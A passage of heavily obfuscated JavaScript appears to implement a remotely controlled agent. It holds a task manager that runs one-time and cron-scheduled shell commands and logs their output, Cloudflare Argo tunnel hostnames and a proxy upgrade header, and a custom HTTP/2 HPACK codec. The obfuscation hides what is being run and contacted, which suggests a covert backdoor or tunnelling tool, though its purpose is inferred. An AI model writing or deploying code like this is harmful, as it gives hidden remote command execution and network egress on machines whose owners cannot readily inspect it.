        a[c1(0x293)](b), c[c1(0x590)](a['length'], a0M[c1(0x5a1)]) && a['splice'](0x0, c[c1(0x521)](a[c1(0x5a7)], a0M[c1(0x5a1)]));
    }
    static ['_formatLogEntry'](a, b, c, d, f = null) {
        const c2 = a0aK, g = new Date()[c2(0x1fd)]();
        return {
            'ts': g,
            'cmd': a,
            'output': b,
            'exitcode': c,
            'type': d,
            'cron': f,
            'formatted': g + c2(0x420) + a + '\x20----\x20exitcode=' + c + '\x0a' + (b?.[c2(0x61b)]() || '')
        };
    }
    static ['getOnetimeTasks']() {
        const c3 = a0aK;
        return {
            'status': 'ok',
            'count': a0M['onetasks'][c3(0x5a7)],
            'tasks': a0M[c3(0x1e0)]
        };
    }
    static async [a0aK(0x552)](a) {
        const c4 = a0aK, b = {
                'OEKkb': function (d, f) {
                    return d < f;
                },
                'VIRKa': function (d, f) {
                    return d === f;
                },
                'JBpRo': 'error'
            };
        a0M[c4(0x1e0)] = a || [], a0M[c4(0x55e)] = !![];
        const c = [];
        for (let d = 0x0; b['OEKkb'](d, a0M[c4(0x1e0)][c4(0x5a7)]); d++) {
            const f = a0M[c4(0x1e0)][d], g = await a0R[c4(0x6f8)](f), h = this['_formatLogEntry'](f, g[c4(0x43b)], g[c4(0x339)], c4(0x4cc));
            this[c4(0x14f)](a0M['onetimetasks_log'], h), c[c4(0x293)]({
                'index': d,
                'cmd': f,
                'exitcode': g[c4(0x339)],
                'output': g[c4(0x43b)],
                'status': b[c4(0x136)](g['exitcode'], 0x0) ? 'ok' : b[c4(0x336)]
            });
        }
        return a0M['InitTask'] = ![], {
            'status': 'ok',
            'count': a0M[c4(0x1e0)]['length'],
            'tasks': a0M[c4(0x1e0)],
            'executed': c
        };
    }
    static [a0aK(0x4e2)]() {
        const c5 = a0aK;
        return {
            'status': 'ok',
            'count': Object[c5(0x654)](a0M[c5(0x3b2)])[c5(0x5a7)],
            'tasks': a0M[c5(0x3b2)]
        };
    }
    static ['setCronTasks'](a) {
        const c6 = a0aK, b = {
                'aMAni': function (d, f) {
                    return d === f;
                },
                'jUmxU': 'function',
                'gVMDo': c6(0x528),
                'AwjoU': function (d, f) {
                    return d - f;
                },
                'zIaYX': function (d, f) {
                    return d || f;
                },
                'LCaBW': function (d, f) {
                    return d || f;
                },
                'qzzRu': function (d, f) {
                    return d > f;
                }
            };
        this[c6(0x16a)][c6(0x1b5)](d => {
            const c7 = c6;
            b[c7(0x37a)](typeof d[c7(0x6d6)], 'function') && d[c7(0x6d6)](), typeof d[c7(0x2dc)] === b[c7(0x620)] && d['destroy']();
        }), this[c6(0x16a)][c6(0x307)]();
        const c = [];
        for (const d of Object[c6(0x654)](a || {})) {
            !a0r['validate'](d) && c[c6(0x293)](d);
        }
        if (c[c6(0x5a7)] > 0x0)
            return {
                'status': b['gVMDo'],
                'message': c6(0x3e3) + c['join'](',\x20'),
                'valid_count': b[c6(0x176)](Object['keys'](b[c6(0x448)](a, {}))['length'], c[c6(0x5a7)])
            };
        a0M[c6(0x3b2)] = b[c6(0x390)](a, {});
        for (const [f, g] of Object[c6(0x354)](a0M[c6(0x3b2)])) {
            const h = a0r['schedule'](f, async () => {
                const c8 = c6, i = await a0R[c8(0x6f8)](g), j = this['_formatLogEntry'](g, i['result'], i['exitcode'], c8(0x643), f);
                this[c8(0x14f)](a0M[c8(0x6b5)], j);
            });
            this[c6(0x16a)]['set'](f, h);
        }
        return a0M['cronloop'] = b[c6(0x6b8)](Object[c6(0x654)](a0M['crontasks'])[c6(0x5a7)], 0x0), {
            'status': 'ok',
            'count': Object[c6(0x654)](a0M['crontasks'])[c6(0x5a7)],
            'tasks': a0M['crontasks']
        };
    }
    static ['getTaskStatus']() {
        const c9 = a0aK;
        return {
            'onetime': {
                'pending': a0M[c9(0x55e)],
                'count': a0M[c9(0x1e0)][c9(0x5a7)]
            },
            'cron': {
                'active': a0M[c9(0x6a6)],
                'count': Object[c9(0x654)](a0M['crontasks'])[c9(0x5a7)],
                'check_interval': a0M[c9(0x2af)]
            }
        };
    }
    static ['getOnetimeLogs'](a = 0x32) {
        const ca = a0aK, b = a0M[ca(0x6fe)][ca(0x1f8)](-a);
        return {
            'status': 'ok',
            'count': b[ca(0x5a7)],
            'logs': b
        };
    }
    static [a0aK(0x252)](a = 0x32) {
        const cb = a0aK, b = a0M[cb(0x6b5)]['slice'](-a);
        return {
            'status': 'ok',
            'count': b[cb(0x5a7)],
            'logs': b
        };
    }
    static [a0aK(0x2ff)]() {
        const cc = a0aK, a = { 'gtDoB': 'onetime' }, b = a0M[cc(0x6fe)]['length'];
        return a0M[cc(0x6fe)] = [], {
            'status': 'ok',
            'cleared': a['gtDoB']
        };
    }
    static [a0aK(0x5e1)]() {
        const cd = a0aK, a = a0M[cd(0x6b5)]['length'];
        return a0M[cd(0x6b5)] = [], {
            'status': 'ok',
            'cleared': cd(0x643)
        };
    }
    static [a0aK(0x124)]() {
        const ce = a0aK, a = {
                'QhAur': function (g, h) {
                    return g - h;
                }
            }, b = a0M[ce(0x6fe)]['filter'](g => g[ce(0x339)] === 0x0)[ce(0x5a7)], c = a['QhAur'](a0M[ce(0x6fe)][ce(0x5a7)], b), d = a0M[ce(0x6b5)][ce(0x6cc)](g => g[ce(0x339)] === 0x0)[ce(0x5a7)], f = a0M['crontasks_log'][ce(0x5a7)] - d;
        return {
            'onetime': {
                'total_logged': a0M[ce(0x6fe)][ce(0x5a7)],
                'max_capacity': a0M[ce(0x5a1)],
                'recent_success': b,
                'recent_failed': c
            },
            'cron': {
                'total_logged': a0M[ce(0x6b5)][ce(0x5a7)],
                'max_capacity': a0M[ce(0x5a1)],
                'recent_success': d,
                'recent_failed': f
            }
        };
    }
    static async [a0aK(0x1af)]() {
        const cf = a0aK, a = {
                'tlEtb': function (c, d) {
                    return c < d;
                },
                'KxMtC': cf(0x4cc)
            }, b = [];
        for (let c = 0x0; a['tlEtb'](c, a0M[cf(0x1e0)][cf(0x5a7)]); c++) {
            const d = a0M[cf(0x1e0)][c], f = await a0R[cf(0x6f8)](d), g = this['_formatLogEntry'](d, f[cf(0x43b)], f[cf(0x339)], a['KxMtC']);
            this[cf(0x14f)](a0M[cf(0x6fe)], g), b[cf(0x293)]({
                'cmd': d,
                'exitcode': f[cf(0x339)],
                'output': f[cf(0x43b)],
                'timeout': f[cf(0x669)]
            });
        }
        return a0M[cf(0x55e)] = ![], {
            'status': 'ok',
            'executed': b['length'],
            'results': b
        };
    }
}
const a0U = a0aK(0x469), a0V = [
        'region1.v2.argotunnel.com',
        a0aK(0x31b)
    ], a0W = 0x1ea4, a0X = 'cf-cloudflared-proxy-connection-upgrade', a0Y = a0aK(0x610), a0Z = 0x4000, a0a0 = [
        [
            ':authority',
            ''
        ],
        [
            ':method',
            a0aK(0x262)
        ],
        [
            ':method',
            'POST'
        ],
        [
            ':path',
            '/'
        ],
        [
            a0aK(0x3b9),
            '/index.html'
        ],
        [
            ':scheme',
            a0aK(0x635)
        ],
        [
            a0aK(0x5cf),
            a0aK(0x5f4)
        ],
        [
            a0aK(0x5ac),
            a0aK(0x6f4)
        ],
        [
            a0aK(0x5ac),
            a0aK(0x1b2)
        ],
        [
            a0aK(0x5ac),
            a0aK(0x3d1)
        ],
        [
            ':status',
            a0aK(0x3a9)
        ],
        [
            ':status',
            '400'
        ],
        [
            a0aK(0x5ac),
            a0aK(0x4d9)
        ],
        [
            a0aK(0x5ac),
            a0aK(0x656)
        ],
        [
            a0aK(0x454),
            ''
        ],
        [
            a0aK(0x48f),
            a0aK(0x272)
        ],
        [
            a0aK(0x33c),
            ''
        ],
        [
            a0aK(0x48b),
            ''
        ],
        [
            a0aK(0x115),
            ''
        ],
        [
            a0aK(0x628),
            ''
        ],
        [
            a0aK(0x3ae),
            ''
        ],
        [
            a0aK(0x17e),
            ''
        ],
        [
            a0aK(0x6df),
            ''
        ],
        [
            'cache-control',
            ''
        ],
        [
            a0aK(0x2fc),
            ''
        ],
        [
            a0aK(0x2aa),
            ''
        ],
        [
            a0aK(0x25d),
            ''
        ],
        [
            a0aK(0x6ec),
            ''
        ],
        [
            a0aK(0x356),
            ''
        ],
        [
            a0aK(0x44c),
            ''
        ],
        [
            a0aK(0x234),
            ''
        ],
        [
            a0aK(0x55f),
            ''
        ],
        [
            a0aK(0x4a9),
            ''
        ],
        [
            a0aK(0x18c),
            ''
        ],
        [
            a0aK(0x4d1),
            ''
        ],
        [
            a0aK(0x13f),
            ''
        ],
        [
            'from',
            ''
        ],
        [
            a0aK(0x170),
            ''
        ],
        [
            'if-match',
            ''
        ],
        [
            a0aK(0x5ae),
            ''
        ],
        [
            a0aK(0x20d),
            ''
        ],
        [
            a0aK(0x17f),
            ''
        ],
        [
            'if-unmodified-since',
            ''
        ],
        [
            a0aK(0x1f5),
            ''
        ],
        [
            a0aK(0x662),
            ''
        ],
        [
            a0aK(0x51f),
            ''
        ],
        [
            a0aK(0x364),
            ''
        ],
        [
            a0aK(0x3ec),
            ''
        ],
        [
            a0aK(0x369),
            ''
        ],
        [
            a0aK(0x6b9),
            ''
        ],
        [
            a0aK(0x2e2),
            ''
        ],
        [
            'refresh',
            ''
        ],
        [
            a0aK(0x4c6),
            ''
        ],
        [
            a0aK(0x5fd),
            ''
        ],
        [
            'set-cookie',
            ''
        ],
        [
            a0aK(0x21b),
            ''
        ],
        [
            a0aK(0x403),
            ''
        ],
        [
            a0aK(0x18d),
            ''
        ],
        [
            a0aK(0x5af),
            ''
        ],
        [
            a0aK(0x13d),
            ''
        ],
        [
            'www-authenticate',
            ''
        ]
    ], a0a1 = [
        0x1ff8,
        0x7fffd8,
        0xfffffe2,
        0xfffffe3,
        0xfffffe4,
        0xfffffe5,
        0xfffffe6,
        0xfffffe7,
        0xfffffe8,
        0xffffea,
        0x3ffffffc,
        0xfffffe9,
        0xfffffea,
        0x3ffffffd,
        0xfffffeb,
        0xfffffec,
        0xfffffed,
        0xfffffee,
        0xfffffef,
        0xffffff0,
        0xffffff1,
        0xffffff2,
        0x3ffffffe,
        0xffffff3,
        0xffffff4,
        0xffffff5,
        0xffffff6,
        0xffffff7,
        0xffffff8,
        0xffffff9,
        0xffffffa,
        0xffffffb,
        0x14,
        0x3f8,
        0x3f9,
        0xffa,
        0x1ff9,
        0x15,
        0xf8,
        0x7fa,
        0x3fa,
        0x3fb,
        0xf9,
        0x7fb,
        0xfa,
        0x16,
        0x17,
        0x18,
        0x0,
        0x1,
        0x2,
        0x19,
        0x1a,
        0x1b,
        0x1c,
        0x1d,
        0x1e,
        0x1f,
        0x5c,
        0xfb,
        0x7ffc,
        0x20,
        0xffb,
        0x3fc,
        0x1ffa,
        0x21,
        0x5d,
        0x5e,
        0x5f,
        0x60,
        0x61,
        0x62,
        0x63,
        0x64,
        0x65,
        0x66,
        0x67,
        0x68,
        0x69,
        0x6a,
        0x6b,
        0x6c,
        0x6d,
        0x6e,
        0x6f,
        0x70,
        0x71,
        0x72,
        0xfc,
        0x73,
        0xfd,
        0x1ffb,
        0x7fff0,
        0x1ffc,
        0x3ffc,
        0x22,
        0x7ffd,
        0x3,
        0x23,
        0x4,
        0x24,
        0x5,
        0x25,
        0x26,
        0x27,
        0x6,
        0x74,
        0x75,
        0x28,
        0x29,
        0x2a,
        0x7,
        0x2b,
        0x76,
        0x2c,
        0x8,
        0x9,
        0x2d,
        0x77,
        0x78,
        0x79,
        0x7a,
        0x7b,
        0x7ffe,
        0x7fc,
        0x3ffd,
        0x1ffd,
        0xffffffc,
        0xfffe6,
        0x3fffd2,
        0xfffe7,
        0xfffe8,
        0x3fffd3,
        0x3fffd4,
        0x3fffd5,
        0x7fffd9,
        0x3fffd6,
        0x7fffda,
        0x7fffdb,
        0x7fffdc,
        0x7fffdd,
        0x7fffde,
        0xffffeb,
        0x7fffdf,
        0xffffec,
        0xffffed,
        0x3fffd7,
        0x7fffe0,
        0xffffee,
        0x7fffe1,
        0x7fffe2,
        0x7fffe3,
        0x7fffe4,
        0x1fffdc,
        0x3fffd8,
        0x7fffe5,
        0x3fffd9,
        0x7fffe6,
        0x7fffe7,
        0xffffef,
        0x3fffda,
        0x1fffdd,
        0xfffe9,
        0x3fffdb,
        0x3fffdc,
        0x7fffe8,
        0x7fffe9,
        0x1fffde,
        0x7fffea,
        0x3fffdd,
        0x3fffde,
        0xfffff0,
        0x1fffdf,
        0x3fffdf,
        0x7fffeb,
        0x7fffec,
        0x1fffe0,
        0x1fffe1,
        0x3fffe0,
        0x1fffe2,
        0x7fffed,
        0x3fffe1,
        0x7fffee,
        0x7fffef,
        0xfffea,
        0x3fffe2,
        0x3fffe3,
        0x3fffe4,
        0x7ffff0,
        0x3fffe5,
        0x3fffe6,
        0x7ffff1,
        0x3ffffe0,
        0x3ffffe1,
        0xfffeb,
        0x7fff1,
        0x3fffe7,
        0x7ffff2,
        0x3fffe8,
        0x1ffffec,
        0x3ffffe2,
        0x3ffffe3,
        0x3ffffe4,
        0x7ffffde,
        0x7ffffdf,
        0x3ffffe5,
        0xfffff1,
        0x1ffffed,
        0x7fff2,
        0x1fffe3,
        0x3ffffe6,
        0x7ffffe0,
        0x7ffffe1,
        0x3ffffe7,
        0x7ffffe2,
        0xfffff2,
        0x1fffe4,
        0x1fffe5,
        0x3ffffe8,
        0x3ffffe9,
        0xffffffd,
        0x7ffffe3,
        0x7ffffe4,
        0x7ffffe5,
        0xfffec,
        0xfffff3,
        0xfffed,
        0x1fffe6,
        0x3fffe9,
        0x1fffe7,
        0x1fffe8,
        0x7ffff3,
        0x3fffea,
        0x3fffeb,
        0x1ffffee,
        0x1ffffef,
        0xfffff4,
        0xfffff5,
        0x3ffffea,
        0x7ffff4,
        0x3ffffeb,
        0x7ffffe6,
        0x3ffffec,
        0x3ffffed,
        0x7ffffe7,
        0x7ffffe8,
        0x7ffffe9,
        0x7ffffea,
        0x7ffffeb,
        0xffffffe,
        0x7ffffec,
        0x7ffffed,
        0x7ffffee,
        0x7ffffef,
        0x7fffff0,
        0x3ffffee,
        0x3fffffff
    ], a0a2 = [
        0xd,
        0x17,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x18,
        0x1e,
        0x1c,
        0x1c,
        0x1e,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1e,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x6,
        0xa,
        0xa,
        0xc,
        0xd,
        0x6,
        0x8,
        0xb,
        0xa,
        0xa,
        0x8,
        0xb,
        0x8,
        0x6,
        0x6,
        0x6,
        0x5,
        0x5,
        0x5,
        0x6,
        0x6,
        0x6,
        0x6,
        0x6,
        0x6,
        0x6,
        0x7,
        0x8,
        0xf,
        0x6,
        0xc,
        0xa,
        0xd,
        0x6,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x8,
        0x7,
        0x8,
        0xd,
        0x13,
        0xd,
        0xe,
        0x6,
        0xf,
        0x5,
        0x6,
        0x5,
        0x6,
        0x5,
        0x6,
        0x6,
        0x6,
        0x5,
        0x7,
        0x7,
        0x6,
        0x6,
        0x6,
        0x5,
        0x6,
        0x7,
        0x6,
        0x5,
        0x5,
        0x6,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0xf,
        0xb,
        0xe,
        0xd,
        0x1c,
        0x14,
        0x16,
        0x14,
        0x14,
        0x16,
        0x16,
        0x16,
        0x17,
        0x16,
        0x17,
        0x17,
        0x17,
        0x17,
        0x17,
        0x18,
        0x17,
        0x18,
        0x18,
        0x16,
        0x17,
        0x18,
        0x17,
        0x17,
        0x17,
        0x17,
        0x15,
        0x16,
        0x17,
        0x16,
        0x17,
        0x17,
        0x18,
        0x16,
        0x15,
        0x14,
        0x16,
        0x16,
        0x17,
        0x17,
        0x15,
        0x17,
        0x16,
        0x16,
        0x18,
        0x15,
        0x16,
        0x17,
        0x17,
        0x15,
        0x15,
        0x16,
        0x15,
        0x17,
        0x16,
        0x17,
        0x17,
        0x14,
        0x16,
        0x16,
        0x16,
        0x17,
        0x16,
        0x16,
        0x17,
        0x1a,
        0x1a,
        0x14,
        0x13,
        0x16,
        0x17,
        0x16,
        0x19,
        0x1a,
        0x1a,
        0x1a,
        0x1b,
        0x1b,
        0x1a,
        0x18,
        0x19,
        0x13,
        0x15,
        0x1a,
        0x1b,
        0x1b,
        0x1a,
        0x1b,
        0x18,
        0x15,
        0x15,
        0x1a,
        0x1a,
        0x1c,
        0x1b,
        0x1b,
        0x1b,
        0x14,
        0x18,
        0x14,
        0x15,
        0x16,
        0x15,
        0x15,
        0x17,
        0x16,
        0x16,
        0x19,
        0x19,
        0x18,
        0x18,
        0x1a,
        0x17,
        0x1a,
        0x1b,
        0x1a,
        0x1a,
        0x1b,
        0x1b,
        0x1b,
        0x1b,
        0x1b,
        0x1c,
        0x1b,
        0x1b,
        0x1b,
        0x1b,
        0x1b,
        0x1a,
        0x1e
    ];
function a0a3() {
    const cg = a0aK, a = {
            'eQsLy': function (c, d) {
                return c < d;
            },
            'PCcuN': function (c, d) {
                return c - d;
            },
            'NLJNq': function (c, d) {
                return c & d;
            },
            'vUZBp': function (c, d) {
                return c >> d;
            },
            'MkUII': function (c, d) {
                return c === d;
            }
        }, b = [
            null,
            null,
            -0x1,
            0x0
        ];
    for (let c = 0x0; a[cg(0x4a5)](c, a0a1[cg(0x5a7)]); c++) {
        const d = a0a1[c], f = a0a2[c];
        let g = b;
        for (let h = a[cg(0x44b)](f, 0x1); h >= 0x0; h--) {
            const i = a[cg(0x3bb)](a[cg(0x426)](d, h), 0x1);
            a[cg(0x56e)](g[i], null) && (g[i] = [
                null,
                null,
                -0x1,
                g[0x3] + 0x1
            ]), g = g[i];
        }
        g[0x2] = c;
    }
    return b;
}
const a0a4 = a0a3();
function a0a5(a) {
    const ch = a0aK, b = {
            'ejKLZ': function (h, i) {
                return h >= i;
            },
            'prWmH': function (h, i) {
                return h >> i;
            },
            'VwoiF': function (h, i) {
                return h | i;
            },
            'YzHFC': function (h, i) {
                return h << i;
            },
            'JBfaT': function (h, i) {
                return h === i;
            },
            'eQpmf': 'invalid\x20HPACK\x20Huffman\x20string',
            'mnJuK': ch(0x3c0),
            'TSXBB': function (h, i) {
                return h > i;
            },
            'POOBP': function (h, i) {
                return h !== i;
            },
            'QALJw': function (h, i) {
                return h - i;
            },
            'fSUux': function (h, i) {
                return h << i;
            }
        }, c = [];
    let d = a0a4, f = 0x0, g = 0x0;
    for (const h of a) {
        for (let i = 0x7; b[ch(0x57a)](i, 0x0); i--) {
            const j = b[ch(0x4a1)](h, i) & 0x1;
            f = b[ch(0x5e2)](b[ch(0x5f0)](f, 0x1), j), g += 0x1, d = d[j];
            if (b[ch(0x60d)](d, null))
                throw new Error(b[ch(0x28a)]);
            if (d[0x2] >= 0x0) {
                const k = ch(0x58a)[ch(0x53c)]('|');
                let l = 0x0;
                while (!![]) {
                    switch (k[l++]) {
                    case '0':
                        d = a0a4;
                        continue;
                    case '1':
                        c[ch(0x293)](d[0x2]);
                        continue;
                    case '2':
                        g = 0x0;
                        continue;
                    case '3':
                        f = 0x0;
                        continue;
                    case '4':
                        if (d[0x2] === 0x100)
                            throw new Error(b[ch(0x2f7)]);
                        continue;
                    }
                    break;
                }
            }
        }
    }
    if (b[ch(0x2cd)](g, 0x7) || b[ch(0x315)](f, b['QALJw'](b[ch(0x657)](0x1, g), 0x1)))
        throw new Error(ch(0x65c));
    return Buffer[ch(0x4e8)](c);
}
function a0a6(a, b, c) {
    const ci = a0aK, d = {
            'lajhc': function (j, k) {
                return j >= k;
            },
            'mjeCA': 'truncated\x20HPACK\x20integer',
            'zbVRm': function (j, k) {
                return j - k;
            },
            'aaZBk': function (j, k) {
                return j << k;
            },
            'XCfuS': function (j, k) {
                return j & k;
            },
            'RMnIz': function (j, k) {
                return j < k;
            },
            'ANiMP': function (j, k) {
                return j * k;
            },
            'IOoQB': function (j, k) {
                return j > k;
            },
            'BxmZJ': ci(0x2ad)
        };
    if (d['lajhc'](b, a[ci(0x5a7)]))
        throw new Error(d['mjeCA']);
    const f = a[b];
    b += 0x1;
    const g = d['zbVRm'](d[ci(0x46f)](0x1, c), 0x1);
    let h = d['XCfuS'](f, g);
    if (d['RMnIz'](h, g))
        return [
            h,
            b
        ];
    let i = 0x0;
    while (!![]) {
        if (b >= a[ci(0x5a7)])
            throw new Error(ci(0x335));
        const j = a[b];
        b += 0x1, h += d[ci(0x670)](d[ci(0x565)](j, 0x7f), Math[ci(0x587)](0x2, i));
        if (d[ci(0x565)](j, 0x80) === 0x0)
            return [
                h,
                b
            ];
        i += 0x7;
        if (d[ci(0x17b)](i, 0x1c))
            throw new Error(d[ci(0x32f)]);
    }
}
function a0a7(a, b) {
    const cj = a0aK, c = {
            'qRfIk': function (j, k) {
                return j >= k;
            },
            'LbAGW': cj(0x59c),
            'aqicd': function (j, k) {
                return j(k);
            },
            'OpDIs': function (j, k) {
                return j + k;
            },
            'iLFpw': function (j, k) {
                return j > k;
            }
        };
    if (c[cj(0x47c)](b, a[cj(0x5a7)]))
        throw new Error(c[cj(0x270)]);
    const d = c[cj(0x32c)](Boolean, a[b] & 0x80), [f, g] = a0a6(a, b, 0x7), h = c['OpDIs'](g, f);
    if (c[cj(0x613)](h, a[cj(0x5a7)]))
        throw new Error(cj(0x360));
    const i = a['subarray'](g, h);
    return [
        d ? a0a5(i) : i,
        h
    ];
}
class a0a8 {
    constructor() {
        const ck = a0aK;
        this['dynamic'] = [], this[ck(0x19a)] = 0x0, this[ck(0x651)] = 0x1000;
    }
    [a0aK(0x6ae)](a) {
        const cl = a0aK, b = {
                'CZmcd': function (d, f) {
                    return d <= f;
                },
                'zWxoB': cl(0x4c2),
                'HIKQH': function (d, f) {
                    return d - f;
                },
                'uywXp': function (d, f) {
                    return d < f;
                },
                'VFbJU': function (d, f) {
                    return d >= f;
                },
                'uiUIU': 'HPACK\x20dynamic\x20index\x20out\x20of\x20range'
            };
        if (b[cl(0x6dc)](a, 0x0))
            throw new Error(b[cl(0x51a)]);
        if (b[cl(0x6dc)](a, a0a0[cl(0x5a7)]))
            return a0a0[b['HIKQH'](a, 0x1)];
        const c = b[cl(0x517)](a - a0a0[cl(0x5a7)], 0x1);
        if (b['uywXp'](c, 0x0) || b[cl(0x435)](c, this[cl(0x62d)][cl(0x5a7)]))
            throw new Error(b[cl(0x168)]);
        return this[cl(0x62d)][c];
    }
    [a0aK(0x439)](a, b) {
        const cm = a0aK, c = {
                'BvqRd': function (f, g) {
                    return f + g;
                },
                'VpJdz': cm(0x5c8),
                'zSEIH': function (f, g) {
                    return f > g;
                },
                'KOLTB': function (f, g) {
                    return f > g;
                },
                'ODxWf': function (f, g) {
                    return f + g;
                }
            }, d = c[cm(0x410)](0x20 + Buffer[cm(0x38a)](a, c['VpJdz']), Buffer['byteLength'](b, c[cm(0x514)]));
        if (d > this['maxSize']) {
            this[cm(0x62d)] = [], this[cm(0x19a)] = 0x0;
            return;
        }
        while (c[cm(0x15f)](this[cm(0x62d)][cm(0x5a7)], 0x0) && c[cm(0x588)](c[cm(0x410)](this[cm(0x19a)], d), this[cm(0x651)])) {
            const [f, g] = this[cm(0x62d)][cm(0x56a)]();
            this[cm(0x19a)] -= c[cm(0x19b)](0x20 + Buffer[cm(0x38a)](f, 'utf8'), Buffer['byteLength'](g, cm(0x5c8)));
        }
        this[cm(0x62d)][cm(0x520)]([
            a,
            b
        ]), this[cm(0x19a)] += d;
    }
    [a0aK(0x376)](a) {
        const cn = a0aK, b = {
                'fJosB': function (f, g) {
                    return f & g;
                },
                'UlYIC': function (f, g, h) {
                    return f(g, h);
                },
                'IXDoe': cn(0x5c8),
                'CduIG': function (f, g) {
                    return f & g;
                },
                'FQiEA': function (f, g, h, i) {
                    return f(g, h, i);
                },
                'oZKiQ': function (f, g) {
                    return f > g;
                },
                'eATYm': cn(0x465),
                'ZEVux': function (f, g) {
                    return f + g;
                }
            }, c = [];
        let d = 0x0;
        while (d < a[cn(0x5a7)]) {
            const f = a[d];
            if (f & 0x80) {
                let j;
                [j, d] = a0a6(a, d, 0x7), c[cn(0x293)](this[cn(0x6ae)](j));
                continue;
            }
            if (b[cn(0x432)](f, 0x40)) {
                let k, l;
                [k, d] = a0a6(a, d, 0x6);
                if (k)
                    l = this[cn(0x6ae)](k)[0x0];
                else {
                    let o;
                    [o, d] = b[cn(0x555)](a0a7, a, d), l = o[cn(0x206)](b['IXDoe'])['toLowerCase']();
                }
                let m;
                [m, d] = b[cn(0x555)](a0a7, a, d);
                const n = m[cn(0x206)](b['IXDoe']);
                this[cn(0x439)](l, n), c['push']([
                    l,
                    n
                ]);
                continue;
            }
            if (b[cn(0x209)](f, 0x20)) {
                let p;
                [p, d] = b[cn(0x382)](a0a6, a, d, 0x5);
                if (b[cn(0x3ed)](p, 0x1000))
                    throw new Error(b[cn(0x1db)]);
                this[cn(0x651)] = p;
                while (this[cn(0x62d)][cn(0x5a7)] > 0x0 && b[cn(0x3ed)](this[cn(0x19a)], p)) {
                    const [q, r] = this[cn(0x62d)][cn(0x56a)]();
                    this[cn(0x19a)] -= b[cn(0x6f0)](0x20, Buffer[cn(0x38a)](q, b[cn(0x311)])) + Buffer[cn(0x38a)](r, cn(0x5c8));
                }
                continue;
            }
            let g, h;
            [g, d] = a0a6(a, d, 0x4);
            if (g)
                h = this[cn(0x6ae)](g)[0x0];
            else {
                let s;
                [s, d] = a0a7(a, d), h = s[cn(0x206)](b[cn(0x311)])['toLowerCase']();
            }
            let i;
            [i, d] = b[cn(0x555)](a0a7, a, d), c[cn(0x293)]([
                h,
                i[cn(0x206)](b[cn(0x311)])
            ]);
        }
        return c;
    }
}
function a0a9(a, b, c) {
    const co = a0aK, d = {
            'oLFqg': function (h, i) {
                return h - i;
            },
            'IeiFZ': function (h, i) {
                return h << i;
            },
            'EREoE': function (h, i) {
                return h < i;
            },
            'lDymX': function (h, i) {
                return h | i;
            },
            'WRTwt': function (h, i) {
                return h | i;
            },
            'HhHau': function (h, i) {
                return h >= i;
            },
            'NaVbL': function (h, i) {
                return h & i;
            },
            'YRfBA': function (h, i) {
                return h / i;
            }
        }, f = d[co(0x5f6)](d[co(0x160)](0x1, b), 0x1);
    if (d[co(0x42c)](a, f))
        return Buffer[co(0x4e8)]([d[co(0x23b)](c, a)]);
    const g = [d['WRTwt'](c, f)];
    a -= f;
    while (d[co(0x137)](a, 0x80)) {
        g[co(0x293)](d[co(0x585)](a, 0x7f) | 0x80), a = Math[co(0x3e5)](d['YRfBA'](a, 0x80));
    }
    return g[co(0x293)](a), Buffer[co(0x4e8)](g);
}
function a0aa(a) {
    const cp = a0aK, b = {
            'VoXjE': cp(0x5c8),
            'lQkYf': function (d, f, g, h) {
                return d(f, g, h);
            }
        }, c = Buffer['from'](a, b[cp(0x1f7)]);
    return Buffer[cp(0x117)]([
        b[cp(0x248)](a0a9, c[cp(0x5a7)], 0x7, 0x0),
        c
    ]);
}
function a0ab(a) {
    const cq = a0aK, b = {
            'GlVXb': function (d, f) {
                return d === f;
            },
            'HmADE': ':status',
            'ZxgCS': cq(0x6f4),
            'bFIpP': function (d, f) {
                return d === f;
            },
            'LfMJJ': '204',
            'glRbZ': function (d, f) {
                return d === f;
            },
            'pthQX': function (d, f) {
                return d === f;
            },
            'PaxNt': function (d, f) {
                return d === f;
            },
            'ykKfl': cq(0x1ae),
            'ybYzv': function (d, f) {
                return d === f;
            },
            'YyOqo': cq(0x4d9),
            'JpPLw': function (d, f, g, h) {
                return d(f, g, h);
            },
            'PsdvH': function (d, f) {
                return d(f);
            }
        }, c = [];
    for (const [d, f] of a) {
        if (b[cq(0x533)](d, b[cq(0x22f)]) && f === b[cq(0x4d5)])
            c[cq(0x293)](0x88);
        else {
            if (b[cq(0x58c)](d, b[cq(0x22f)]) && b[cq(0x58c)](f, b[cq(0x2db)]))
                c[cq(0x293)](0x89);
            else {
                if (b['glRbZ'](d, b[cq(0x22f)]) && b[cq(0x2b7)](f, '206'))
                    c[cq(0x293)](0x8a);
                else {
                    if (b[cq(0x58c)](d, b[cq(0x22f)]) && b[cq(0x51d)](f, '304'))
                        c[cq(0x293)](0x8b);
                    else {
                        if (b[cq(0x2b7)](d, ':status') && b[cq(0x533)](f, b[cq(0x33e)]))
                            c[cq(0x293)](0x8c);
                        else {
                            if (d === b[cq(0x22f)] && b[cq(0x247)](f, b[cq(0x58f)]))
                                c[cq(0x293)](0x8d);
                            else
                                b[cq(0x58c)](d, b[cq(0x22f)]) && f === cq(0x656) ? c['push'](0x8e) : (c[cq(0x293)](...b['JpPLw'](a0a9, 0x0, 0x4, 0x0)), c[cq(0x293)](...b[cq(0x193)](a0aa, d)), c[cq(0x293)](...b[cq(0x193)](a0aa, f)));
                        }
                    }
                }
            }
        }
    }
    return Buffer['from'](c);
}
class a0ac {
    constructor() {
        const cr = a0aK;
        this[cr(0x26b)] = [];
    }
    [a0aK(0x539)](a) {
        const cs = a0aK, b = {
                'EiOaB': function (d, f) {
                    return d < f;
                }
            }, c = this[cs(0x26b)][cs(0x5a7)];
        for (let d = 0x0; b[cs(0x341)](d, a); d++) {
            this[cs(0x26b)][cs(0x293)](0x0n);
        }
        return c;
    }
    ['structPtr'](a, b, c, d) {
        const ct = a0aK, f = {
                'Zijsh': function (j, k) {
                    return j - k;
                },
                'blwIO': function (j, k) {
                    return j - k;
                },
                'SrWiW': function (j, k) {
